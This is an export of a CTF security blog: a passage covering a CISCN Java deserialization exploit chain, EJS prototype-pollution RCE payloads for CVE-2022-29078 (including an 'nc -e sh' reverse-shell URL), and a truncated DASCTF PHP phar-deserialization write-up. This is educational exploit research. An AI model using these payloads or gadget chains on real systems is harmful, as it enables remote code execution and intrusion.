com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        System.out.println(getSkus());</span><br><span class="line">        System.out.println(getOldCart());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSkus</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputStr</span> <span class="operator">=</span> <span class="string">&quot;test123&quot;</span>;<span class="comment">//写入数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        map.put(filename,inputStr.getBytes());</span><br><span class="line">        skuDescribe.set(cart,map);</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line">        <span class="keyword">return</span>(serialize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOldCart</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;C:\\code\\timu\\ezj4va\\&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        cart.setSkuDescribe((Map&lt;String, Object&gt;) o);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cartCookie</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line"></span><br><span class="line">        Deserializer.deserialize(cartCookie);</span><br><span class="line">        <span class="keyword">return</span> cartCookie;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试可以正常写入数据</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525191515-rfqfsn6.png" alt="image.png"></p><h2 id="0x04-写入到rce"><a href="#0x04-写入到rce" class="headerlink" title="0x04 写入到rce"></a>0x04 写入到rce</h2><p>由于这是个加固题，所以我们对自己的整个服务器位置路径都很清楚，因此写入文件的路径问题就得到了解决。</p><p>跟<a href="http://w4nder.top/index.php/2021/07/21/ciscn2021-javachallenges/">w4nder👴👴学的姿势</a>，通过写入一个恶意的class然后加载它，好骚好骚</p><p>calc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Serializable readObject&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入classes目录下，直接加载就行</p><p>本机测试：</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525203639-bgl5ns4.png" alt="image.png"></p><p>远程：</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525210448-xsx4d50.png" alt="image.png"></p><p>这个报错绕不过去，更改了jdk版本和他相同也不行</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>链子不难，攻击过程没搞完，加固修改uid<br>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.calc;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        System.out.println(getSkus());</span><br><span class="line">        System.out.println(getOldCart());</span><br><span class="line">        System.out.println(getCalc());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSkus</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputStr</span> <span class="operator">=</span> readFile(<span class="string">&quot;C:\\code\\timu\\ezj4va\\target\\classes\\ciscn\\fina1\\ezj4va\\calc.class&quot;</span>);<span class="comment">//写入数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;calc.class&quot;</span>;</span><br><span class="line">        map.put(filename,inputStr.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        skuDescribe.set(cart,map);</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line">        <span class="keyword">return</span>(serialize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOldCart</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">skuDescribe</span> <span class="operator">=</span> cart.getClass().getDeclaredField(<span class="string">&quot;skuDescribe&quot;</span>);</span><br><span class="line">        skuDescribe.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;/app/target/classes/ciscn/fina1/ezj4va/&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        cart.setSkuDescribe((Map&lt;String, Object&gt;) o);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cartCookie</span> <span class="operator">=</span> Serializer.serialize(cart);</span><br><span class="line"></span><br><span class="line">        Deserializer.deserialize(cartCookie);</span><br><span class="line">        <span class="keyword">return</span> cartCookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 根据path路径实例化一个输入流的对象</span></span><br><span class="line">        <span class="type">FileInputStream</span>  <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">        <span class="comment">//2. 返回这个输入流中可以被读的剩下的bytes字节的估计值；</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> fis.available();</span><br><span class="line">        System.out.println(size);</span><br><span class="line">        <span class="comment">//3. 根据输入流中的字节数创建byte数组；</span></span><br><span class="line">        <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="comment">//4.把数据读取到数组中；</span></span><br><span class="line">        fis.read(array);</span><br><span class="line">        <span class="comment">//5.根据获取到的Byte数组新建一个字符串，然后输出；</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(array);</span><br><span class="line">        result = result.replaceAll(<span class="string">&quot;\r|\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCalc</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> Serializer.serialize(calc);</span><br><span class="line">        <span class="keyword">return</span> serialize;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ciscn2021 final中的一道java题目</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ejs模板rce的初探</title>
    <link href="https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/"/>
    <id>https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/</id>
    <published>2022-05-28T06:35:47.000Z</published>
    <updated>2022-06-02T00:37:08.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渲染处rce"><a href="#渲染处rce" class="headerlink" title="渲染处rce"></a>渲染处rce</h1><p><code>res.render(&#39;index&#39;);</code>中的一系列通过变量（其他漏洞达成）带来的模板注入。</p><h2 id="opts-outputFunctionName"><a href="#opts-outputFunctionName" class="headerlink" title="opts.outputFunctionName"></a>opts.outputFunctionName</h2><blockquote><p>ejs版本&lt;3.17</p></blockquote><p>如果可以通过原型链污染控制这个属性的值，就可以在渲染的模板中拼接任意命令。</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524191015-q4qyd8q.png" alt="image.png"></p><p> 在模板渲染过程中，这个属性一般是undefined。</p><p>注入payload如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">// After injection</span><br><span class="line">prepended += <span class="string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span>di<span class="string">r&#x27;); __tmp2 = __append;&#x27;</span></span><br><span class="line">// 拼接了命令语句</span><br></pre></td></tr></table></figure><p>同理下面几个变量也都可以尝试，<code>opts.localsName</code> 和 <code>opts.destructuredLocals</code> 和 <code>opts.filename</code></p><p>修复：添加了一个正则，对上面几个涉及的变量进行过滤</p><p><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf</a></p><h2 id="opts-escapeFunction"><a href="#opts-escapeFunction" class="headerlink" title="opts.escapeFunction"></a>opts.escapeFunction</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">      src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样是被拼接进了要渲染的源码中，造成了rce的情况，为了达成条件判断也需要控制其他的变量来达到rce</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span>,</span><br><span class="line">            <span class="string">&quot;compileDebug&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span>,</span><br><span class="line">            <span class="string">&quot;compileDebug&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CVE-2022-29078"><a href="#CVE-2022-29078" class="headerlink" title="CVE-2022-29078"></a>CVE-2022-29078</h1><p><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">https://eslam.io/posts/ejs-server-side-template-injection-rce/</a></p><p>原型链污染+模板注入，用的是outputFunction，但其实原型链污染的操作比较重要，如下构造payload我们就能在使用ejs3.17一下的版本中通过原型链污染达到rce</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;nc -e sh 127.0.0.1 1337&#x27;);s</span></span><br></pre></td></tr></table></figure><p>同样可以通过另一个escapeFunction来进行rce，此方法在3.17可行！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//localhost:3000/page?id=2&amp;settings[view%20options][client]=ture&amp;settings[view%20options][escapeFunction]=1;%20return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27calc%27);&amp;settings[view%20options][compileDebug]=ture&amp;settings[view%20options][debug]=ture</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对ejs带来的模板渲染处的rce的小研究</summary>
    
    
    
    <category term="nodejsSec" scheme="https://xianbeil.github.io/categories/nodejsSec/"/>
    
    
    <category term="ejs模板rce" scheme="https://xianbeil.github.io/tags/ejs%E6%A8%A1%E6%9D%BFrce/"/>
    
  </entry>
  
  <entry>
    <title>dasctf4月赛</title>
    <link href="https://xianbeil.github.io/2022/05/25/dasctf4%E6%9C%88%E8%B5%9B/"/>
    <id>https://xianbeil.github.io/2022/05/25/dasctf4%E6%9C%88%E8%B5%9B/</id>
    <published>2022-05-25T06:37:27.000Z</published>
    <updated>2022-06-01T06:40:06.260Z</updated>
    
    <content type="html"><![CDATA[<h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>附件给了4个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;<span class="comment">//__get</span></span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();<span class="comment">//__call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p>可控的就是Action类中的construct方法，给的类很多，</p><p>从他继承的抽象类的run方法一直进去，反正变量都可控，随便打</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518192621-gsp7td3.png" alt="image.png"></p><h2 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h2><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>.<span class="number">3</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /tmp/files/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 755 /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R www-data:www-data /var/www/html/uploads &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install nginx -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gcc /tmp/files/copyflag.c -o /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4711 /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /tmp/files &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx&amp;&amp;php-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>index.php中有注释，标注了edit.php，简单构造能够读到源码</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194507-ta3lasm.png" alt="image.png"></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194514-hq2mbfa.png" alt="image.png"></p><p>这道题是可以用条件竞争非预期的，就是再覆盖flag那里可以趁他覆盖之前，访问head.png，读到就行</p><ol><li>利用文件上传上传 phar文件</li><li>写入超长文件名使得 <code>symlink()</code>函数出错返回 false</li><li><code>unlink()</code>触发 phar 反序列化将flag写入到可读的<code>/tmp/flag.txt</code> 处</li><li>建立与 <code>/tmp/flag.txt</code> 与 <code>uploads/head.png</code> 的软连接</li><li>在建立与 <code>/tmp/flag.txt</code> 的软链接之前程序会将原来写入的flag给覆盖掉。所以要在覆盖flag后，另一个线程已经在copy <code>/falg</code>到 <code>/tmp/flag.txt</code>，这样 <code>/uploads/head.png</code>与<code>/tmp/flag.txt</code>建立了链接，同时flag也没有被覆盖，然后访问 <code>/uploads/head.png</code>读取即可。</li></ol><p>这里研究作者的预期解，如何让symlink函数报错进到unlink里面</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518200409-92bp8yw.png" 